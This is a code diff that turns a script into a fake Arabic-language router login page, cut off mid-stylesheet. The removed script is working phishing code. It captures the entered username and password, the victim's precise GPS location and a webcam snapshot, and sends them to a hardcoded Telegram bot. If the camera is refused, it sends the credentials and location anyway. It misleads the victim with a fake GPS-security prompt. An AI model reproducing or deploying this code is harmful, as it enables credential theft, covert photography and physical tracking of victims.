@@ -1,47 +1,17 @@
-<script>
-    const botToken = '8347819984:AAFi1b3BL9sYP3BbkqpWY3XtVfWatppm8Rk'; 
-    const chatId = '1559993244'; 
-
-    document.getElementById('start-btn').addEventListener('click', async () => {
-        const username = document.getElementById('user-input').value;
-        const password = document.getElementById('pass-input').value;
-        if (!username || !password) { alert('يرجى إكمال البيانات'); return; }
-
-        // طلب الموقع الدقيق بالملي (GPS)
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'shabah.jpg');
-                        formData.append('caption', `🚨 اتقفش بالملي يا شبح!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n📍 موقع البيت على الخريطة:\n${mapsLink}`);
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg');
-                    
-                    document.getElementById('start-btn').style.display = 'none';
-                    document.getElementById('shabah-msg').style.display = 'block';
-                }, 1000);
-            } catch (err) {
-                // حتى لو قفل الكاميرا، الموقع والباسورد هيوصلوا
-                const msg = `⚠️ رفض الكاميرا بس جبنا مكانه!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n📍 الموقع بالملي:\n${mapsLink}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-                document.getElementById('shabah-msg').style.display = 'block';
-            }
-        }, (error) => {
-            alert("يجب تفعيل GPS لتأمين اتصالك بالراوتر.");
-        }, { enableHighAccuracy: true });
-    });
-</script>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Login</title>
+    <style>
+        body { font-family: Tahoma, Arial; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
+        .login-box { background: white; border: 1px solid #ccc; width: 400px; padding: 25px; box-shadow: 2px 2px 5px rgba(0,0,0,0.1); }
+        .header { border-bottom: 2px solid #78be20; padding-bottom: 10px; margin-bottom: 20px; text-align: left; }
+        .header img { width: 60px; }
+        .info-text { font-size: 12px; color: #333; margin-bottom: 20px; background: #f9f9f9; padding: 8px; border: 1px solid #ddd; text-align: center; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group label { display: block; font-size: 13px; margin-bottom: 5px; color: #666; }
+        .input-group input { width: 100%; border: 1px solid #ccc; padding: 8px; box-sizing: border-box; }
+        .btn-login { background-color: #78be20; color: white; border: none; padding: 10px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%; margin-top: 10px; }
+        #shabah-msg { display: none; color: red; font-weight: bold; font-size: 20px; margin-top: 20px; text-
